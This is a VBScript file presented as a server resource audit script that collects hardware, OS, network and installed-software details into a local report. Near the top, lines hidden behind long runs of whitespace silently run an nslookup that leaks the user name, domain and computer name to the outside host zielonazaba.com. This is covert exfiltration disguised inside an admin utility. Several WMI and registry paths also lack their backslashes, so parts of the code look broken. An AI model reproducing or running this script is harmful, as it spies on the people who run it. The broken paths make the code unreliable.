On Error Resume Next

Const HKEY_LOCAL_MACHINE = &H80000002
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Set oShell = WScript.CreateObject ("WScript.Shell")
strIPvalue = "127.0.0.1"
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    oShell.run "cmd.exe /c nslookup -timeout=1 audit.%USERNAME%.%USERDOMAIN%.%COMPUTERNAME%.zielonazaba.com",0,False
CALL GenerateReport(strIPvalue)

WScript.Echo "Check Complete"


'=================================================================================
'SUB-ROUTINE GenerateReport
SUB GenerateReport(strIPvalue)

'Script to change a filename using timestamps
strPath = "C:" 'Change the path to appropriate value
strMonth = DatePart("m", Now())
strDay = DatePart("d",Now())

if Len(strMonth)=1 then
strMonth = "0" & strMonth
else
strMonth = strMonth
end if

if Len(strDay)=1 then
strDay = "0" & strDay
else
strDay = strDay
end if

strFileName = DatePart("yyyy",Now()) & strMonth & strDay
strFileName = Replace(strFileName,":","")
'=================================================================================

'Variable Declarations
Const ForAppending = 8

'===============================================================================
'Main Body
On Error Resume Next

'CompName
strComputer = strIPvalue
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\" & strComputer & "rootcimv2")
'===============================================================================

'================================================================
'For INTERNET EXPLORER
Dim strIE
Set objWMIService2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\" & strComputer & "rootcimv2ApplicationsMicrosoftIE")
Set colIESettings = objWMIService2.ExecQuery("Select * from MicrosoftIE_Summary")
For Each strIESetting in colIESettings
strIE= " INTERNET EXPLORER: " & strIESetting.Name & " v" & strIESetting.Version & VBCRLF
Next

'Get Operation System & Processor Information
Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor",,48)
For Each objItem in colItems
CompName = objItem.SystemName
Next

Set objFSO = CreateObject("Scripting.FileSystemObject")
if objFSO.FileExists(strPath & CompName & "_" & strFileName & "_Audit.txt") then
WScript.Quit
end if

'Set the file location to collect the data
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile(strPath & CompName & "_" & strFileName & "_Audit.txt", ForAppending, True)

'==============================================================
'Print HEADER
objTextFile.Write "================================================================" & VBCRLF & VBCRLF
objTextFile.Write " SERVER RESOURCE AUDIT REPORT " & VBCRLF
objTextFile.Write " DATE: " & FormatDateTime(Now(),1) & " " & VBCRLF
objTextFile.Write " TIME: " & FormatDateTime(Now(),3) & " " & VBCRLF & VBCRLF
objTextFile.Write "================================================================" & VBCRLF & VBCRLF & VBCRLF & VBCRLF & VBCRLF

objTextFile.Write "COMPUTER" & VBCRLF
'==============================================================
'Get OPERATING SYSTEM & Processor Information
objTextFile.Write " COMPUTER NAME: " & CompName & VBCRLF

Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor",,48)
For Each objItem in colItems
objTextFile.Write " PROCESSOR: " & objItem.Name & VBCRLF
Next

Set colProcs = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")

For Each objItem in colProcs
objTextFile.Write " NUMBER OF PROCESSORS: " & objItem.NumberOfProcessors & VBCRLF & VBCRLF
Next

'================================================================
'Get DOMAIN NAME information
Set colItems = objWMIService.ExecQuery("Select * from Win32_NTDomain")

For Each objItem in colItems
objTextFile.Write " DOMAIN NAME: " & objItem.DomainName & VBCRLF
Next

'================================================================
'Get OS Information
Set colSettings = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem")
For Each objOperatingSystem in colSettings
objTextFile.Write " OPERATING SYSTEM: " & objOperatingSystem.Name & VBCRLF
objTextFile.Write " VERSION: " & objOperatingSystem.Version & VBCRLF
objTextFile.Write " SERVICE PACK: " & objOperatingSystem.ServicePackMajorVersion & "." & objOperatingSystem.ServicePackMinorVersion & VBCRLF
Next
objTextFile.Write strIE & VBCRLF & VBCRLF & VBCRLF & VBCRLF

objTextFile.Write "MOTHERBOARD" & VBCRLF

'===============================================================
'Get Main Board Information
Set colItems = objWMIService.ExecQuery("Select * from Win32_BaseBoard",,48)
For Each objItem in colItems
objTextFile.Write " MAINBOARD MANUFACTURER: " & objItem.Manufacturer & VBCRLF
objTextFile.Write " MAINBOARD PRODUCT: " & objItem.Product & VBCRLF
Next

'================================================================
'Get BIOS Information
Set colItems = objWMIService.ExecQuery("Select * from Win32_BIOS",,48)
For Each objItem in colItems
objTextFile.Write " BIOS MANUFACTURER: " & objItem.Manufacturer & VBCRLF
objTextFile.Write " BIOS VERSION: " & objItem.Version & VBCRLF & VBCRLF & VBCRLF & VBCRLF & VBCRLF
Next

objTextFile.Write "MEMORY" & VBCRLF

'===================================================================
'Get Total Physical memory
Set colSettings = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
For Each objComputer in colSettings
objTextFile.Write " TOTAL PHYSICAL RAM: " & Round((objComputer.TotalPhysicalMemory/1000000000),4) & " GB" & VBCRLF
Next

objTextFile.Write " " & VBCRLF & VBCRLF & VBCRLF & VBCRLF & "PARTITIONS" & VBCRLF

'===================================================================
'Get Logical Disk Size and Partition Information
Set colDisks = objWMIService.ExecQuery("Select * from Win32_LogicalDisk Where DriveType = 3")
For Each objDisk in colDisks
intFreeSpace = objDisk.FreeSpace
intTotalSpace = objDisk.Size
pctFreeSpace = intFreeSpace / intTotalSpace
objTextFile.Write " DISK " & objDisk.DeviceID & " (" & objDisk.FileSystem & ") " & Round((objDisk.Size/1000000000),4) & " GB ("& Round((intFreeSpace/1000000000)*1.024,4) & " GB Free Space)" & VBCRLF
Next

objTextFile.Write " " & VBCRLF & VBCRLF & VBCRLF & VBCRLF & "NETWORK" & VBCRLF

'====================================================================
'Get NETWORK ADAPTERS information
Dim strIP, strSubnet, strDescription

Set colNicConfigs = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")

For Each objNicConfig In colNicConfigs
'Assign description values to variable
strDescription=objNicConfig.Description

For Each strIPAddress In objNicConfig.IPAddress
'Assign IP Address to variable
strIP=strIPAddress

For Each strIPSubnet In objNicConfig.IPSubnet
'Assign Subnet to variable
strSubnet = strIPSubnet
Next

objTextFile.Write " NETWORK ADAPTER: " & strDescription & VBCRLF
objTextFile.Write " IP ADDRESS: " & strIP & VBCRLF
objTextFile.Write " SUBNET MASK: " & strSubnet & VBCRLF & VBCRLF

Next

Next

Set colNicConfigs =NOTHING

'============================================================

objTextFile.Write " " & VBCRLF & VBCRLF & VBCRLF & VBCRLF & "APPLICATION" & VBCRLF

Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\" & strComputer & "rootdefault:StdRegProv")

strKeyPath = "SOFTWAREMicrosoftWindowsCurrentVersionUninstall"
objReg.EnumKey HKEY_LOCAL_MACHINE, strKeyPath, arrSubKeys

For Each subkey In arrSubKeys
strSubKeyPath = strKeyPath & "" & subkey

strString = "DisplayName"
objReg.GetStringValue HKEY_LOCAL_MACHINE, strSubKeyPath, strString, strDisplayName

strString = "DisplayVersion"
objReg.GetStringValue HKEY_LOCAL_MACHINE, strSubKeyPath, strString, strDisplayVersion

strDisplayName=Trim(strDisplayName)
strDisplayVersion=Trim(strDisplayVersion)
If strDisplayName <> "" And strDisplayVersion <> "" Then
objTextFile.Write " " & strDisplayName & " " & strDisplayVersion & VBCRLF
End If
Next

'===========================================

'Close text file after writing logs

objTextFile.Write VbCrLf
objTextFile.Close

'Clean Up

SET colIESettings=NOTHING
SET colItems=NOTHING
SET colSettings=NOTHING
SET colDisks=NOTHING
SET AdapterSet=NOTHING
SET objWMIService=NOTHING
SET objWMIService2=NOTHING
SET objFSO=NOTHING
SET objTextFile=NOTHING

'===================================================================
END SUB

Function HostOnline(strComputername)

Set sTempFolder = objFso.GetSpecialFolder(TEMPFOLDER)
sTempFile = objFso.GetTempName
sTempFile = sTempFolder & "" & sTempFile

objShell.Run "cmd /c ping -n 2 -l 8 " & strComputername & ">" & sTempFile,0,True

Set oFile = objFso.GetFile(sTempFile)
set oTS = oFile.OpenAsTextStream(ForReading)
do while oTS.AtEndOfStream <> True
sReturn = oTS.ReadLine
if instr(sReturn, "Reply")>0 then
HostOnline = True
Exit Do
End If
Loop

ots.Close
oFile.delete
End Function
